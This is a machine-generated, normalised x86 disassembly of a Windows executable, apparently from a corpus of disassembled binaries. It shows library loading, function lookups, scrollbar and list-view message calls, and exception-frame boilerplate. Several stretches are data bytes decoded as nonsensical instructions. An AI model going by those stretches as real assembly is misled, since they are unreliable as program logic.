mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_41da34
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor edx edx
push ebp
push sub_41dde6
push [ fs : edx ]
mov [ fs : edx ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dded
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
push r-xdata
call LoadLibraryW
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_41d36c
mov [ rw-data ] eax
sub_41e508
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_41e530
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e578
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e57f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4481b0
call sub_41d874
cmp [ rw-data ] 0x0
jg r-xdata
sub_41e5a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e5c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5cc
retn
sub_41e62c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx [ esi ]
mov edx [ ebx ]
mov eax edi
call sub_44a0e8
pop edi
pop esi
pop ebx
retn
sub_41e6ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e6d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e6d8
retn
sub_41e716
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0x3d
out 0x41 eax
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e744
retn
sub_41e750
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e775
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e77c
retn
sub_41e788
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e7ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7b4
retn
sub_41e7c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41e7e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e7ec
retn
sub_41e7f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_41e8da
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
movzx eax bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8e1
lea eax [ ebp - 0x8 ]
call sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx 0x0
call sub_449f58
mov eax [ ebp - 0x8 ]
call sub_449890
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_41e7f8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449d80
sub_41e9b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_41e7f8
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_41f028
push ebp
add [ ebx ] dl
inc ebp
add [ edx ] dl
xor eax [ eax ]
xor al [ eax ]
add [ cs : eax + eax + 0x4c ] al
add [ eax + eax ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41f065
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f06c
retn
sub_41f080
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call j_sub_449880
xor eax eax
push ebp
push sub_41f0cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
call sub_449db8
push eax
push edi
push esi
push ebx
call SendMessageW
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0d2
lea eax [ ebp + 0x8 ]
call j_sub_449348
retn
sub_41f124
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f149
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f150
retn
sub_41f163
dec [ edx ]
add [ eax ] al
add [ ebp ] cl
inc ecx
add [ eax ] dl
dec ecx
add [ ebx ] dh
add [ edx ] dh
add [ esi ] ch
add [ eax + eax + 0x4c ] al
add [ eax + eax ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41f1c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1cc
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call j_sub_449348
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_41f1d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f1fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f204
retn
sub_41f210
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f235
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f23c
retn
sub_41f248
push ebx
push esi
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_41f608
push ebx
push esi
push edi
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryW
mov [ rw-data ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push edi
push esi
call [ rw-data ]
mov ebx eax
sub_41f6cc
push ebx
push esi
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x80004001
cmp [ rw-data ] 0x0
jbe r-xdata
push r-xdata
call LoadLibraryW
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
retn
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push esi
call [ rw-data ]
mov ebx eax
sub_41f780
push ecx
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
xor eax eax
pop edx
retn
mov eax esp
call sub_41f6cc
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov al 0x1
pop edx
retn
sub_41f7a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f7df
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7e6
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_41f7f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f815
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f81c
retn
sub_41f828
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f84d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f854
retn
sub_41f860
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleW
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call sub_41d36c
mov [ rw-data ] eax
sub_41f8e0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_41f860
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_41f928
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageW
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageW
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41f964
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax di
or eax 0x0
push eax
push esi
push 0x1013
push ebx
call SendMessageW
test eax eax
setne al
neg al
sbb eax eax
pop edi
pop esi
pop ebx
retn
sub_41f990
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax di
or eax 0x0
push eax
push esi
push 0x101e
push ebx
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_41f9b0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x28 ] ecx
lea eax [ ebp - 0x34 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageW
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f9e0
add esp 0xffffffcc
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageW
add esp 0x34
retn
sub_41fa0c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x34 ]
push eax
push esi
push 0x1074
push ebx
call SendMessageW
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fa3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41fa61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa68
retn
sub_41fa74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41fa99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41faa0
retn
sub_41fbb1
sti
inc ecx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
push cs
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
je r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420567
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
rcr al 0xe9
leave
adc al 0x0
add [ ebx - 0x36162740 ] al
insd
inc ebp
js r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_449d2c
jmp sub_421130
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42056e
lea eax [ ebp - 0x30 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_420542
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
add [ ebx - 0x72162740 ] al
or [ eax ] eax
add [ ebx + 0x2de9d8c0 ] al
or al 0x0
add [ ebx + 0x31e9d8c0 ] al
or eax 0xc0830000
fsubr st1
or [ esi ] ecx
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
imul ebp [ edi + 0x6e ] 0xcc909090
add eax 0xffffffdc
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0xc ]
test esi esi
je r-xdata
mov eax [ eax + 0x1c ]
retn
dec eax
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_449db8
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xa
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_424590
mov eax edi
dec ax
je r-xdata
lea eax [ ebx + 0x20 ]
mov edx esi
call sub_449d2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_420525
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4246e8
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_4481b0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov ecx esi
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42060c
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4201d8
jmp r-xdata
dec ax
je r-xdata
xor edx edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0xa0 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
xor eax eax
push ebp
push sub_42048a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_4208b4
jmp r-xdata
sub ax 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4481b0
retn
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_4246e8
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_4481b0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov ecx esi
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42060c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420208
sub_41fce4
and esp edi
inc ecx
add [ ebx ] ch
cld
inc ecx
add [ 0x90041fc ] dh
cld
inc ecx
add [ ecx ] dl
cld
inc ecx
add [ ecx ] bl
cld
inc ecx
add [ edi - 0x56ffbe04 ] bl
cld
inc ecx
add [ ebx + 0x6f0041fc ] dh
cld
inc ecx
add [ edi - 0x4 ] dh
inc ecx
add [ edi - 0x4 ] bh
inc ecx
add [ edi - 0x70ffbe04 ] al
cld
inc ecx
add [ edi + 0x670041fc ] dl
cld
inc ecx
add [ edi ] bh
cld
inc ecx
add [ edi - 0x4 ] al
inc ecx
add [ edi - 0x4 ] cl
inc ecx
add [ edi - 0x4 ] dl
inc ecx
add [ edi - 0x4 ] bl
inc ecx
add ch al
cld
inc ecx
add bh cl
cld
inc ecx
add cl bl
cld
inc ecx
add [ ebp + 0x50041fc ] bh
add [ eax ] al
add [ 0xa6b0cdb ] al
retn
sub_41fd56
int1
sbb al 0xd1
xchg ebp eax
cmp [ esi - 0x1c ] bl
cld
movsd [ edi ] [ esi ]
leave
aam 0xfc
cld
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
mov al [ 0xfffffffffb15f98e ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
push 0x0
pop esi
0x8f824eb1 0xf1a7
xlat
popfd
rol [ edx ] cl
cld
cld
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x33 ] ch
lds ecx [ eax - 0x1e ]
jno r-xdata
in al 0xfc
cmp bh ah
cld
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x204cf9ea ] cl
mov ebp 0xbeb94045
pop ds
and edi [ edx + 0x385c3311 ]
std
inc ecx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dh bh
inc ecx
add [ eax - 0x3 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc [ ecx ]
inc esp
popad
outsb
popad
jb r-xdata
add [ eax ] al
mov edx eax
test edx edx
je r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
nop
nop
cld
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
inc [ ecx ]
xor al 0x0
add [ eax ] al
fcom [ edi + 0x44 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
